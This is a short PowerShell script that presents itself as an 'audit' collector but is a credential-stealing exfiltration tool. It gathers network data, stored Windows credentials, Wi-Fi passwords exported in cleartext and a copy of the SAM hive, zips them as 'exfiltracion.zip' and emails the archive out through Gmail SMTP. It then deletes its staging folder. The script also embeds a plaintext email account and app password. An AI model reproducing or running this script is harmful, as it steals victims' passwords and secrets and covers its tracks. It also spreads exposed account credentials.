mkdir C:\Windows\Temp\AuditData
Get-NetIPConfiguration > C:\Windows\Temp\AuditData\Ipconfig.txt
Get-NetTCPConnection > C:\Windows\Temp\AuditData\Puertos.txt
cmdkey /list > C:\Windows\Temp\AuditData\credenciales.txt
netsh wlan export profile key=clear folder=C:\Windows\Temp\AuditData
copy C:\Windows\System32\drivers\etc\hosts C:\Windows\Temp\AuditData\hosts.txt
copy C:\Windows\System32\config\SAM C:\Windows\Temp\AuditData\SAM
Compress-Archive -Path C:\Windows\Temp\AuditData\* -DestinationPath C:\Windows\Temp\AuditData\exfiltracion.zip

$SMTPServer = "smtp.gmail.com"; $SMTPPort = "587"; $Username = "hugovima09@gmail.com"; $Password = "jzyf ahuq ldjp pusf"; $To = "hugovima09@gmail.com"; $Attachment = "C:\Windows\Temp\AuditData\exfiltracion.zip"; $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort); $SMTPClient.EnableSsl = $true; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password); $Message = New-Object Net.Mail.MailMessage; $Message.From = $Username; $Message.To.Add($To); $Message.Subject = "$(cmd /c echo %username%) - $(cmd /c echo %userdomain%)"; $Message.Attachments.Add($Attachment); $SMTPClient.Send($Message); $Message.Attachments.Dispose(); $Message.Dispose()

Remove-Item -Recurse -Force C:\Windows\Temp\AuditData
